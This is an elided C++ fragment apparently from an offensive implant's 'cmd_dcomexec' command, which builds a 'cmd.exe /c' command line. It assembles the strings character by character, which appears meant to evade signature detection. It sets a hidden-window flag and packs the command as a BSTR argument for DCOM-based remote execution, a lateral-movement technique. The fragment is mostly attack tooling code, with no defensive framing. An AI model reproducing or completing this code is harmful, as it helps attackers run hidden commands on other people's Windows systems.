...
auto declfn starburst::cmd_dcomexec(
    ...
    // cmd.exe /c <command>
    wchar_t w_cmd[] = { 'c','m','d','.','e','x','e', 0 };
    wchar_t w_empty[] = { 0 };
    wchar_t w_hidden[] = { '7', 0 };

    wchar_t w_params[2048] = { '/','c',' ', 0 };
    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, command_str, command_len, w_params + 3, 2044 );
    ...
    args[1].vt = VT_BSTR; args[1].bstrVal = pSysAllocString( w_params );    // Parameters
